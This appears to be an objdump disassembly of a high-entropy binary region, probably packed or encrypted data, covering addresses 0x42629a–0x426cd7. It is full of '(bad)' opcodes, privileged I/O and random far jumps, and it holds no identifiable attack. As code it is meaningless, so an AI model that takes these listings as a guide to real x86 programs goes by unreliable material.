  42629a:	lahf   
  42629b:	sbb    DWORD PTR [eax-0x7],esp
  42629e:	inc    ecx
  42629f:	pop    ebx
  4262a0:	push   es
  4262a1:	mov    eax,0xc3dcc9b1
  4262a6:	inc    ebx
  4262a7:	lahf   
  4262a8:	push   cs
  4262a9:	jp     0x42630f
  4262ab:	dec    ebp
  4262ac:	dec    ebp
  4262ad:	and    ch,BYTE PTR [edi+0x4c]
  4262b0:	outs   dx,BYTE PTR ds:[esi]
  4262b1:	pushf  
  4262b2:	out    0x7c,eax
  4262b4:	test   bh,0xcd
  4262b7:	mov    al,0x74
  4262b9:	add    BYTE PTR [ecx],ah
  4262bb:	and    eax,0x18b35f98
  4262c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262c1:	mov    ds:0xc9645644,eax
  4262c6:	popa   
  4262c7:	loop   0x4262ff
  4262c9:	test   eax,0xe986ad85
  4262ce:	ror    DWORD PTR [edi+ebp*1+0x5b],0x1b
  4262d3:	das    
  4262d4:	retf   
  4262d5:	aas    
  4262d6:	imul   edx,edi,0x28
  4262d9:	out    0xca,al
  4262db:	jne    0x42632a
  4262dd:	mov    cl,0x82
  4262df:	fld    QWORD PTR [ebp-0x7e0bced3]
  4262e5:	sbb    bh,bl
  4262e7:	mov    bl,0x56
  4262e9:	int    0xf0
  4262eb:	pop    ebp
  4262ed:	mov    esi,0x41ae091
  4262f2:	dec    DWORD PTR [ecx]
  4262f4:	leave  
  4262f5:	xchg   esi,eax
  4262f6:	and    bl,BYTE PTR [eax-0x32]
  4262f9:	push   cs
  4262fa:	dec    ebx
  4262fb:	sbb    esp,DWORD PTR [ecx+0xefe7b7c]
  426301:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426302:	pop    ebx
  426303:	shl    DWORD PTR [edi],cl
  426305:	cmp    eax,0x97973d2f
  42630a:	inc    edi
  42630b:	cmp    DWORD PTR [esi-0x2c],edx
  42630e:	sub    al,0xc6
  426310:	sub    esp,DWORD PTR [edx+0x81008bb]
  426316:	dec    esp
  426317:	sbb    DWORD PTR [esi+0x19],esp
  42631a:	add    al,BYTE PTR [ecx-0x66]
  42631d:	sub    bl,dh
  42631f:	leave  
  426320:	jae    0x42639f
  426322:	shl    DWORD PTR [ebx],1
  426324:	pop    edi
  426325:	out    dx,eax
  426326:	hlt    
  426327:	xchg   edx,eax
  426328:	fmul   QWORD PTR [ebx+0x6a9f1019]
  42632e:	cmp    eax,DWORD PTR [eax+0x56f006e1]
  426334:	mov    ah,0xca
  426336:	arpl   WORD PTR [ebp+0x152989d9],cx
  42633c:	in     eax,dx
  42633d:	rcr    BYTE PTR [eax+0x1a],1
  426340:	in     eax,dx
  426341:	add    esi,DWORD PTR [ebp+0x2f4fcce9]
  426347:	sbb    al,0xc2
  426349:	idiv   al
  42634b:	dec    edi
  42634c:	mov    al,0xdd
  42634e:	mov    edx,DWORD PTR [ecx]
  426350:	(bad)  
  426351:	jbe    0x42638c
  426353:	test   al,0x4c
  426355:	jmp    0xf9585c5c
  42635a:	aas    
  42635b:	test   eax,0xe6ca14a6
  426360:	mov    edi,0x4ee56e4a
  426365:	ins    BYTE PTR es:[edi],dx
  426366:	add    al,BYTE PTR [edi-0x75]
  426369:	mov    BYTE PTR [ecx+0x8a3d],dh
	...
  4263d3:	add    BYTE PTR [eax],al
  4263d5:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4263d9:	dec    esi
  4263da:	std    
  4263db:	out    dx,al
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x5ff2e22c
  4263e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263e7:	cdq    
  4263e8:	add    DWORD PTR [eax],eax
  4263ea:	inc    DWORD PTR [eax]
  4263ec:	add    BYTE PTR [eax],al
  4263ee:	(bad)  
  4263f0:	clc    
  4263f1:	mul    DWORD PTR [edi+0x5a]
  4263f4:	and    cl,BYTE PTR [edi]
  4263f6:	push   edi
  4263f7:	arpl   WORD PTR [esi-0x5630fb11],ax
  4263fd:	push   0x3b0cd39f
  426402:	or     al,0xef
  426404:	gs cmp eax,esi
  426407:	adc    eax,0xb7884c20
  42640c:	lock sbb dl,0x7c
  426410:	or     BYTE PTR [edi-0x5e93a29b],0x70
  426417:	in     eax,0xd4
  426419:	xchg   BYTE PTR [edx+0x11],bh
  42641c:	dec    edi
  42641d:	sbb    DWORD PTR [eax+0xe],0xffffffea
  426421:	(bad)  
  426422:	imul   esp,DWORD PTR [eax-0x1e8e5da8],0xffffffde
  426429:	sar    BYTE PTR [ecx-0x44],0x35
  42642d:	in     al,dx
  42642e:	mov    esi,0x3eb8e5b4
  426433:	cli    
  426434:	dec    ecx
  426435:	fs fwait
  426437:	fs out dx,eax
  426439:	jecxz  0x426485
  42643b:	mov    ds:0x3b7fc545,al
  426440:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426441:	dec    ecx
  426442:	repnz mov esi,0x3b664065
  426448:	pop    ss
  426449:	mov    ?,esp
  42644b:	iret   
  42644c:	add    esp,edi
  42644e:	and    DWORD PTR [ecx-0x24],0x6f
  426452:	stc    
  426453:	aam    0x47
  426455:	lahf   
  426456:	int3   
  426457:	mov    ds:0x8b495d00,al
  42645c:	pop    es
  42645d:	sbb    bl,BYTE PTR [ebx+0x6e]
  426460:	aaa    
  426461:	dec    eax
  426462:	sbb    al,ah
  426464:	ds mov al,0x49
  426467:	jecxz  0x426469
  426469:	xchg   esi,eax
  42646a:	leave  
  42646b:	pop    esi
  42646c:	dec    ebx
  42646d:	aas    
  42646e:	neg    DWORD PTR [edx]
  426470:	push   0x397f98eb
  426475:	enter  0x517d,0x1e
  426479:	push   ds
  42647a:	cld    
  42647b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42647c:	cmp    DWORD PTR [edi+ebx*1],ebx
  42647f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426480:	push   0xd53a944e
  426485:	out    dx,eax
  426486:	sub    DWORD PTR [eax],edx
  426488:	cmp    bh,ch
  42648a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42648c:	icebp  
  42648d:	xchg   edi,eax
  42648e:	pop    esp
  42648f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426490:	inc    eax
  426491:	or     al,0xa0
  426493:	cdq    
  426494:	xchg   ecx,eax
  426495:	pop    esp
  426496:	xchg   DWORD PTR [edi+eax*1-0x282017c2],eax
  42649d:	sahf   
  42649e:	or     eax,0xe2bb22de
  4264a3:	fcmovb st,st(0)
  4264a5:	loope  0x426477
  4264a7:	cwde   
  4264a8:	cmp    eax,0x9a79a1bd
  4264ad:	mov    edi,0xf391f13a
  4264b2:	adc    bl,BYTE PTR [eax]
  4264b4:	push   esi
  4264b5:	cmp    eax,0xaa15ffed
  4264ba:	call   0x8cccc5fd
  4264bf:	gs test eax,0x281e509b
  4264c5:	bound  esp,QWORD PTR [ecx+0x77]
  4264c8:	arpl   WORD PTR [ebx+0x72],sp
  4264cb:	icebp  
  4264cc:	aaa    
  4264cd:	outs   dx,DWORD PTR ds:[esi]
  4264ce:	fisubr WORD PTR [ebp-0x76]
  4264d1:	pop    esi
  4264d2:	or     dl,BYTE PTR [ebx-0x65]
  4264d5:	mov    esp,0x5c08b918
  4264da:	mov    cl,0x7e
  4264dc:	mov    BYTE PTR [ecx-0x51],bh
  4264df:	xor    DWORD PTR [eax],esp
  4264e1:	cmp    ebp,DWORD PTR [eax]
  4264e3:	leave  
  4264e4:	scas   al,BYTE PTR es:[edi]
  4264e5:	arpl   WORD PTR [ebx],di
  4264e7:	adc    DWORD PTR [edx-0x48],edi
  4264ea:	stos   DWORD PTR es:[edi],eax
  4264eb:	xchg   ecx,eax
  4264ec:	sbb    DWORD PTR [eax],eax
	...
  426556:	imul   ebp,DWORD PTR [edi-0x78],0xe9ef8e08
  42655d:	outs   dx,DWORD PTR ds:[esi]
  42655e:	vmwrite ecx,DWORD PTR [edx+0x6d10bc85]
  426565:	mov    ds:0x19aa3,al
  42656a:	inc    DWORD PTR [eax]
  42656c:	add    BYTE PTR [eax],al
  42656e:	adc    dh,bh
  426570:	push   edi
  426571:	je     0x42656c
  426573:	or     esp,DWORD PTR [ecx+0x72]
  426576:	imul   BYTE PTR [edx+eax*8]
  426579:	fisub  WORD PTR [ebx+0x4fdb56ce]
  42657f:	imul   DWORD PTR [ebx+0x7a]
  426582:	pop    edi
  426584:	dec    ebp
  426585:	loope  0x4265dc
  426587:	int3   
  426588:	sbb    edi,esp
  42658a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42658b:	fnstenv [ebx+0x1eca0b6]
  426591:	je     0x426555
  426593:	stos   BYTE PTR es:[edi],al
  426594:	bound  edi,QWORD PTR [edi]
  426596:	xlat   BYTE PTR ds:[ebx]
  426597:	xor    edx,ebp
  426599:	in     al,dx
  42659a:	inc    edx
  42659b:	mov    BYTE PTR [esi+0x68],dh
  42659e:	or     al,0x69
  4265a0:	adc    BYTE PTR [esi+0x35],dl
  4265a3:	bound  eax,QWORD PTR [ebx-0x20]
  4265a6:	nop
  4265a7:	(bad)  
  4265a8:	xchg   edi,eax
  4265a9:	mov    eax,0xfe019d1e
  4265ae:	pop    edi
  4265af:	add    BYTE PTR [ecx],al
  4265b1:	(bad)  
  4265b2:	jmp    0xd8e0:0x20c49eff
  4265b9:	sbb    ebp,DWORD PTR [ebp+0x4c]
  4265bc:	jl     0x426605
  4265be:	or     BYTE PTR ds:0xcffd6f44,dh
  4265c4:	pop    ebx
  4265c5:	add    DWORD PTR [edi],eax
  4265c7:	stos   DWORD PTR es:[edi],eax
  4265c8:	popf   
  4265c9:	pop    edi
  4265ca:	mov    al,ds:0xe18ff5a4
  4265cf:	dec    esp
  4265d0:	fstp   TBYTE PTR [ecx-0x167687a4]
  4265d6:	dec    edi
  4265d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265d8:	ins    BYTE PTR es:[edi],dx
  4265d9:	fs jns 0x4265d1
  4265dc:	push   es
  4265dd:	icebp  
  4265de:	add    DWORD PTR [ecx-0x3c],esi
  4265e1:	cdq    
  4265e2:	xor    eax,0xb164e7a9
  4265e7:	inc    ebp
  4265e8:	rcl    BYTE PTR [ebx+0x263681c2],cl
  4265ee:	lock mov al,0x34
  4265f1:	nop
  4265f2:	push   ecx
  4265f3:	xchg   BYTE PTR [edx+0x6b],al
  4265f6:	test   DWORD PTR [ebp+eiz*8-0x3660077c],edi
  4265fd:	aad    0x4d
  4265ff:	and    DWORD PTR [ebp+0x69c8f62f],esi
  426605:	mov    dh,0xc5
  426607:	mov    cl,ch
  426609:	xchg   ecx,eax
  42660a:	stos   DWORD PTR es:[edi],eax
  42660b:	jmp    0xc3ce:0x101bae8
  426612:	inc    esi
  426613:	sub    eax,0x4e2e66e9
  426618:	daa    
  426619:	or     eax,DWORD PTR [edi]
  42661b:	mov    edi,0x13730f98
  426620:	aad    0x19
  426622:	pop    ecx
  426623:	hlt    
  426624:	(bad)  
  426625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426626:	es int 0x14
  426629:	mov    WORD PTR [edi],ss
  42662b:	xor    DWORD PTR [ebp-0x6b],ebx
  42662e:	pop    ebp
  42662f:	or     al,0x57
  426631:	not    ch
  426633:	adc    ebp,esp
  426635:	push   ebp
  426636:	cmp    al,0x2a
  426638:	cmp    bh,BYTE PTR [ecx-0x5b]
  42663b:	ret    
  42663c:	retf   0x25a7
  42663f:	jae    0x42661d
  426641:	icebp  
  426642:	lods   eax,DWORD PTR ds:[esi]
  426643:	jg     0x426605
  426645:	mov    dl,0x1b
  426647:	ins    DWORD PTR es:[edi],dx
  426648:	sbb    eax,0xcde4fd9f
  42664d:	sub    DWORD PTR ds:0xbf013e45,ebp
  426653:	cdq    
  426654:	jo     0x42666c
  426656:	jge    0x426658
  426658:	mov    es,WORD PTR [edi+0x1a841e54]
  42665e:	xor    bl,BYTE PTR [edx+0x43]
  426661:	jno    0x426670
  426663:	and    BYTE PTR ds:0xa6c33159,cl
  426669:	pop    ebx
  42666a:	push   dx
  42666c:	rol    BYTE PTR [eax],0x0
	...
  4266d3:	add    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [edx],dl
  4266d7:	retf   
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x2b44925c]
  4266e4:	sti    
  4266e5:	inc    ebx
  4266e6:	mov    ds:0xff00019b,al
  4266eb:	add    BYTE PTR [eax],al
  4266ed:	add    BYTE PTR [eax+eiz*2],al
  4266f0:	loope  0x4266cb
  4266f2:	and    dh,bl
  4266f4:	das    
  4266f5:	pop    ecx
  4266f6:	not    BYTE PTR [esi-0x2a]
  4266f9:	test   ch,ah
  4266fb:	jecxz  0x426773
  4266fd:	ds aad 0xd9
  426700:	jp     0x42674f
  426702:	dec    eax
  426703:	fadd   QWORD PTR [ebx+0xd]
  426706:	push   es
  426707:	pop    eax
  426708:	jae    0x4266c4
  42670a:	xor    DWORD PTR [edi],edx
  42670c:	mov    dl,0x1a
  42670e:	(bad)  
  426710:	sti    
  426711:	and    ebp,DWORD PTR [ebp+ecx*2-0x58]
  426715:	jmp    0xfefb:0x8041cbbf
  42671c:	dec    esi
  42671d:	ret    
  42671e:	(bad)  
  42671f:	lods   al,BYTE PTR ds:[esi]
  426720:	ds mov ah,0x6e
  426723:	push   ebp
  426724:	xchg   bl,dh
  426726:	mov    eax,DWORD PTR [esi]
  426728:	adc    ebx,eax
  42672a:	mov    DWORD PTR [edx-0x27],ebp
  42672d:	ror    BYTE PTR [ecx],1
  42672f:	pop    ds
  426730:	mov    BYTE PTR [ebp+ecx*8-0x58],dh
  426734:	xchg   ecx,eax
  426735:	mov    ecx,0xfa011b67
  42673a:	pop    esi
  42673b:	div    DWORD PTR [ebp-0x4d5cc2a6]
  426741:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426742:	or     dh,BYTE PTR ds:0x859a2ca1
  426748:	fidivr DWORD PTR [esi+0x72]
  42674b:	pop    es
  42674c:	aam    0x51
  42674e:	adc    eax,0x3baaa48d
  426753:	(bad)  
  426754:	rcl    ch,cl
  426756:	enter  0x90cb,0x12
  42675a:	mov    edi,0x97e1f4d1
  42675f:	add    BYTE PTR [ecx+0x7f],0x8c
  426763:	in     al,0x90
  426765:	xchg   esi,eax
  426766:	mov    bh,0x38
  426768:	test   al,0x84
  42676a:	pop    eax
  42676b:	sub    ch,BYTE PTR [edi-0x1]
  42676e:	or     edx,edx
  426770:	mul    BYTE PTR [esp+edx*4+0x20]
  426774:	shl    DWORD PTR [ebx-0x50],1
  426777:	ror    BYTE PTR [edi+0x721edf32],1
  42677d:	data16 sar BYTE PTR [eax],0x70
  426781:	arpl   WORD PTR [edx-0x3c958209],dx
  426787:	adc    edi,esp
  426789:	pop    esp
  42678a:	outs   dx,BYTE PTR ds:[esi]
  42678b:	mov    edi,0x57c60679
  426790:	stc    
  426791:	ins    DWORD PTR es:[edi],dx
  426792:	dec    eax
  426793:	xchg   DWORD PTR [esi],ebp
  426795:	out    dx,eax
  426796:	fucomi st,st(3)
  426798:	push   ebx
  426799:	outs   dx,DWORD PTR ds:[esi]
  42679a:	or     eax,0x917757fd
  42679f:	and    ebp,ecx
  4267a1:	sbb    edi,DWORD PTR [esi-0x448ff1af]
  4267a7:	aaa    
  4267a8:	ins    BYTE PTR es:[edi],dx
  4267a9:	fadd   QWORD PTR [edx+eiz*8+0x53517f62]
  4267b0:	or     al,cl
  4267b2:	jecxz  0x42677a
  4267b4:	lock xchg ebx,eax
  4267b6:	js     0x4267e6
  4267b8:	and    al,0xa0
  4267ba:	xchg   edi,eax
  4267bb:	jmp    DWORD PTR [esi+0xa]
  4267be:	imul   edx,ecx,0xffffffb5
  4267c1:	mov    cs,WORD PTR [esi+0x15]
  4267c4:	hlt    
  4267c5:	xor    DWORD PTR [ebp-0x3d],ebp
  4267c8:	xchg   ecx,eax
  4267c9:	aad    0xd
  4267cb:	loope  0x42680e
  4267cd:	xchg   esi,eax
  4267ce:	js     0x42678a
  4267d0:	(bad)  
  4267d1:	mov    dh,0x72
  4267d3:	gs mov ah,0x42
  4267d6:	push   cs
  4267d7:	mov    bh,0xae
  4267d9:	in     eax,0x33
  4267db:	div    DWORD PTR [edi]
  4267dd:	call   0x45da:0x10fba08d
  4267e4:	pop    eax
  4267e5:	ins    DWORD PTR es:[edi],dx
  4267e6:	adc    eax,0x10707c70
  4267eb:	or     BYTE PTR [ecx],bl
	...
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	xchg   ecx,eax
  426863:	cmp    bh,BYTE PTR [ecx+0x39]
  426866:	mov    eax,ds:0xff00019c
  42686b:	add    BYTE PTR [eax],al
  42686d:	add    BYTE PTR [ecx-0x4f],bl
  426870:	nop
  426871:	call   0x87ef:0xccb79715
  426878:	lock push esp
  42687a:	xchg   esp,eax
  42687b:	(bad)  
  42687c:	das    
  42687d:	xchg   ecx,eax
  42687e:	enter  0x1ae4,0xc4
  426882:	cmc    
  426883:	jo     0x426822
  426885:	cmp    dl,ah
  426887:	jnp    0x426891
  426889:	outs   dx,DWORD PTR ds:[esi]
  42688a:	pop    edi
  42688b:	push   esi
  42688c:	data16 jnp 0x426838
  42688f:	mov    edi,0xfa2c9a02
  426894:	xchg   ebp,eax
  426895:	cmc    
  426896:	in     al,dx
  426897:	outs   dx,DWORD PTR ds:[esi]
  426898:	or     edi,DWORD PTR [ebx]
  42689a:	jg     0x426846
  42689c:	jp     0x4268b0
  42689e:	shr    BYTE PTR [ecx*8-0x27e3f4c3],cl
  4268a5:	fbstp  TBYTE PTR [edx]
  4268a7:	xor    eax,0xe0b3fd5d
  4268ac:	sbb    BYTE PTR [edx+ebp*2-0x7cbcc7c6],al
  4268b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268b4:	(bad)  
  4268b5:	adc    al,BYTE PTR [edi]
  4268b7:	jmp    0x426932
  4268b9:	popa   
  4268ba:	clc    
  4268bb:	rol    edi,0x42
  4268be:	xor    BYTE PTR [edi+0x6709950d],bh
  4268c4:	jg     0x4268e3
  4268c6:	aad    0xa6
  4268c8:	add    BYTE PTR [ebx+0x4d],0x7a
  4268cc:	inc    edi
  4268cd:	xchg   ecx,eax
  4268ce:	push   ebp
  4268cf:	retf   
  4268d0:	mov    ebx,0xce243c7b
  4268d5:	push   es
  4268d6:	adc    DWORD PTR [edx],edx
  4268d8:	loopne 0x4268d3
  4268da:	cmp    eax,0xdf25f58d
  4268df:	jecxz  0x4268fc
  4268e1:	sar    BYTE PTR [ebp-0x74c82876],1
  4268e7:	mov    eax,ds:0x7c548179
  4268ec:	or     al,0x1
  4268ee:	push   ebx
  4268ef:	pop    DWORD PTR [ecx+0x3e43ac91]
  4268f5:	mov    WORD PTR [ebx-0x66650535],cs
  4268fb:	mov    ah,0xdc
  4268fd:	jge    0x426956
  4268ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426900:	into   
  426901:	dec    esp
  426902:	test   al,0xdf
  426904:	inc    esp
  426905:	and    ebp,edx
  426907:	xchg   edx,eax
  426908:	jae    0x42696e
  42690a:	lods   eax,DWORD PTR ds:[esi]
  42690b:	xor    dh,ch
  42690d:	mov    ebp,0x3d7b8b38
  426912:	inc    esp
  426913:	out    0xb9,eax
  426915:	pop    ebp
  426916:	aaa    
  426917:	xor    al,0x86
  426919:	loope  0x426921
  42691b:	adc    eax,DWORD PTR [ebx-0x77febc74]
  426921:	retf   
  426922:	call   0xb4e09fc2
  426927:	cmp    DWORD PTR ds:0xa457c27c,esp
  42692d:	push   esi
  42692e:	push   cs
  42692f:	mov    eax,ds:0x217d60ca
  426934:	push   0xffffff9d
  426936:	push   edi
  426937:	push   esp
  426938:	rol    esi,1
  42693a:	jmp    0xd7f5e8cd
  42693f:	enter  0xafd3,0x88
  426943:	or     eax,0x32c14228
  426948:	jbe    0x4269b8
  42694a:	sub    BYTE PTR [ebx-0x86ed374],0xbb
  426951:	sti    
  426952:	into   
  426953:	xchg   esp,eax
  426954:	xchg   esi,eax
  426955:	fild   QWORD PTR [edx+0x42]
  426958:	(bad)  
  426959:	sub    eax,0x320820e1
  42695e:	mov    bh,0xdc
  426960:	fldcw  WORD PTR [ebp-0x61e5ca]
  426966:	or     edi,DWORD PTR [edi+0x56]
  426969:	xor    ebx,DWORD PTR [ebx+0x18]
  42696c:	jbe    0x42696e
	...
  4269d6:	mov    WORD PTR [esi+0x7d],cs
  4269d9:	jge    0x4269da
  4269db:	jg     0x426969
  4269dd:	jmp    FWORD PTR [ebx]
  4269df:	in     al,dx
  4269e0:	lahf   
  4269e1:	mov    ebx,DWORD PTR [ebx-0x54]
  4269e4:	and    al,0x74
  4269e6:	mov    al,ds:0xff00019d
  4269eb:	add    BYTE PTR [eax],al
  4269ed:	add    bl,dh
  4269ef:	and    al,0x74
  4269f1:	inc    ebx
  4269f2:	fiadd  DWORD PTR [edx+eax*1+0x64]
  4269f6:	push   es
  4269f7:	mov    ds:0xb647fcbc,eax
  4269fc:	push   esi
  4269fd:	dec    esi
  4269fe:	shr    DWORD PTR [edx],0x35
  426a01:	fdiv   QWORD PTR [edi]
  426a03:	fsub   st(1),st
  426a05:	add    cl,BYTE PTR [ebx-0x2f777b60]
  426a0b:	cmc    
  426a0c:	dec    edx
  426a0d:	and    bh,bh
  426a0f:	push   sp
  426a11:	adc    esi,ecx
  426a13:	fwait
  426a14:	in     al,dx
  426a15:	pop    eax
  426a16:	icebp  
  426a17:	adc    edx,DWORD PTR [edx-0x1f]
  426a1a:	mov    ebp,0x2db10e5d
  426a1f:	mov    eax,ds:0x56906614
  426a24:	jns    0x4269db
  426a26:	add    esp,DWORD PTR [ecx-0x7c]
  426a29:	or     eax,0x79253973
  426a2e:	dec    ebp
  426a2f:	dec    ecx
  426a30:	ins    DWORD PTR es:[edi],dx
  426a31:	leave  
  426a32:	rol    DWORD PTR [ebp+0x43ef0471],1
  426a38:	inc    ecx
  426a39:	mov    eax,0x84c77f1b
  426a3e:	lea    edi,ds:0x2c0dcb49
  426a44:	sub    eax,0xbcb5167f
  426a49:	push   cs
  426a4a:	stc    
  426a4b:	in     al,dx
  426a4c:	xchg   edx,eax
  426a4d:	repz mov ?,WORD PTR [ecx-0x13]
  426a51:	mov    BYTE PTR [edi+0x27],0x1a
  426a55:	icebp  
  426a56:	dec    ecx
  426a57:	call   0x77e5a05f
  426a5c:	xor    ecx,DWORD PTR [esi+eiz*4-0x56]
  426a60:	les    esp,FWORD PTR [ebp-0x35b5cd9e]
  426a66:	cli    
  426a67:	pop    edx
  426a68:	add    eax,0xf3f721cd
  426a6d:	push   ebx
  426a6e:	(bad)  [edi]
  426a70:	fstp   QWORD PTR [ecx]
  426a72:	sahf   
  426a73:	mov    WORD PTR [ecx+0x19],ds
  426a76:	mov    dl,0x18
  426a78:	mov    esp,0x3061ceb7
  426a7d:	stc    
  426a7e:	xchg   edx,eax
  426a7f:	mov    esp,0xb4eceda3
  426a84:	lods   eax,DWORD PTR ds:[esi]
  426a85:	xchg   DWORD PTR ds:0x53c9485c,edx
  426a8b:	stc    
  426a8c:	pop    edi
  426a8d:	xlat   BYTE PTR ds:[ebx]
  426a8e:	inc    edi
  426a8f:	jno    0x426acf
  426a91:	ficom  DWORD PTR [esi+0x1770d32a]
  426a97:	retf   0xda36
  426a9a:	jb     0x426ab9
  426a9c:	lahf   
  426a9d:	push   ds
  426a9e:	xchg   esi,eax
  426a9f:	mov    BYTE PTR [ebx],al
  426aa1:	mov    dh,BYTE PTR [edx]
  426aa3:	pushf  
  426aa4:	cmc    
  426aa5:	call   0xde0f7ee4
  426aaa:	mov    cl,0xc6
  426aac:	aas    
  426aad:	cli    
  426aae:	pushf  
  426aaf:	and    edi,DWORD PTR ds:0x7fd4a57c
  426ab5:	or     ebx,ecx
  426ab7:	and    BYTE PTR [esi-0x1333c95a],0xbb
  426abe:	xor    al,0x60
  426ac0:	jns    0x426a8d
  426ac2:	sbb    edx,DWORD PTR [esi+0x2d]
  426ac5:	inc    ecx
  426ac6:	sub    al,0xee
  426ac8:	dec    eax
  426ac9:	and    edx,DWORD PTR [edx+0x20]
  426acc:	faddp  st(1),st
  426ace:	loop   0x426b19
  426ad0:	jae    0x426b1a
  426ad2:	dec    edx
  426ad3:	aaa    
  426ad4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ad5:	xchg   esp,eax
  426ad6:	xchg   edi,eax
  426ad7:	das    
  426ad8:	push   ecx
  426ad9:	mov    esp,0x9fd42dda
  426ade:	arpl   WORD PTR [esi+0x2],dx
  426ae1:	fcom   DWORD PTR [ebx+0x54]
  426ae4:	mov    esp,0xdcb2c3de
  426ae9:	jns    0x426b10
  426aeb:	aaa    
  426aec:	adc    al,BYTE PTR [eax]
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x17
  426b63:	mov    DWORD PTR [esi-0x36],ecx
  426b66:	lahf   
  426b67:	sahf   
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	inc    DWORD PTR [eax]
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	mov    BYTE PTR [edx+0x3c],cl
  426b71:	jne    0x426be2
  426b73:	ja     0x426b24
  426b75:	dec    edx
  426b76:	pop    edi
  426b77:	cld    
  426b78:	fld    TBYTE PTR [ebx-0x46dc66af]
  426b7e:	daa    
  426b7f:	sbb    ecx,DWORD PTR [edi]
  426b81:	ins    BYTE PTR es:[edi],dx
  426b82:	sbb    ebx,DWORD PTR [esi-0x71]
  426b85:	hlt    
  426b86:	int3   
  426b87:	push   ds
  426b88:	(bad)  
  426b89:	je     0x426b13
  426b8b:	mov    ecx,0xb48c1251
  426b90:	mov    eax,0xecb7561c
  426b95:	sub    ebp,DWORD PTR [ebp+0x8]
  426b98:	or     bh,BYTE PTR [eax]
  426b9a:	fimul  DWORD PTR [esi+0x2]
  426b9d:	xchg   esp,eax
  426b9e:	push   esp
  426b9f:	popf   
  426ba0:	add    ch,BYTE PTR [esi-0x28c5b319]
  426ba6:	pop    es
  426ba7:	scas   eax,DWORD PTR es:[edi]
  426ba8:	arpl   WORD PTR [eax],bx
  426baa:	(bad)  
  426bab:	add    eax,DWORD PTR [esi]
  426bad:	push   0xffffff98
  426baf:	aaa    
  426bb0:	and    al,0xd7
  426bb2:	out    dx,al
  426bb3:	mov    al,ds:0x6578dd35
  426bb8:	push   esp
  426bb9:	jle    0x426be1
  426bbb:	pop    esi
  426bbc:	pushf  
  426bbd:	fstp   QWORD PTR [ebp+0x5ec1b985]
  426bc3:	aaa    
  426bc4:	push   edi
  426bc5:	ja     0x426b78
  426bc7:	xchg   esp,eax
  426bc8:	ss out dx,al
  426bca:	jnp    0x426bc5
  426bcc:	sub    bh,bh
  426bce:	xchg   esi,eax
  426bcf:	fwait
  426bd0:	call   0xf5fb:0x967069d3
  426bd7:	pop    esi
  426bd8:	push   ebx
  426bd9:	mov    WORD PTR [ebx-0x3bc48ddd],?
  426bdf:	sbb    BYTE PTR [ebx],dl
  426be1:	and    ebx,DWORD PTR [esi]
  426be3:	sub    eax,0x6550138
  426be8:	mul    ah
  426bea:	into   
  426beb:	push   0x5cbe099a
  426bf0:	push   0x70cc416c
  426bf5:	jle    0x426bad
  426bf7:	fidiv  DWORD PTR [ebx]
  426bf9:	clc    
  426bfa:	xchg   edx,eax
  426bfb:	fwait
  426bfc:	jge    0x426c6a
  426bfe:	jmp    0x426bb1
  426c00:	pop    ebx
  426c01:	sbb    DWORD PTR [edi+0x2],eax
  426c04:	pop    edi
  426c05:	dec    edx
  426c06:	add    edi,DWORD PTR [edx+0x50]
  426c09:	addr16 inc ecx
  426c0b:	jp     0x426c0d
  426c0d:	icebp  
  426c0e:	sbb    al,0xa9
  426c10:	push   cs
  426c11:	mov    ch,0xc5
  426c13:	sub    edi,esi
  426c15:	std    
  426c16:	hlt    
  426c17:	add    BYTE PTR [edx],0xff
  426c1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c1b:	dec    edi
  426c1c:	das    
  426c1d:	push   es
  426c1e:	(bad)  
  426c1f:	adc    bl,BYTE PTR [ebp+ebp*1+0x5f]
  426c23:	pop    ecx
  426c24:	call   FWORD PTR ds:0xea6c6fe8
  426c2a:	mov    edi,0xb3c7f87
  426c2f:	jae    0x426ca6
  426c31:	and    eax,0x9102d4bc
  426c36:	push   esp
  426c37:	gs inc ecx
  426c39:	push   ss
  426c3a:	imul   ebp,DWORD PTR [edx-0x113aaca5],0x78
  426c41:	mov    dl,0x14
  426c43:	fsubr  QWORD PTR [ecx]
  426c45:	jmp    0x426c9a
  426c47:	adc    eax,0xe7573e18
  426c4c:	rcr    esp,cl
  426c4e:	in     eax,0x1b
  426c50:	jecxz  0x426ca3
  426c52:	mov    edx,0x9e458792
  426c57:	cdq    
  426c58:	jmp    0x93d8:0xfdf4906f
  426c5f:	or     al,0xbd
  426c61:	inc    ebp
  426c62:	loope  0x426c6e
  426c64:	sbb    al,BYTE PTR [esi]
  426c66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c67:	or     BYTE PTR [ebp-0x1e251afb],bh
	...
  426cd5:	add    dl,ah
  426cd7:	pusha  
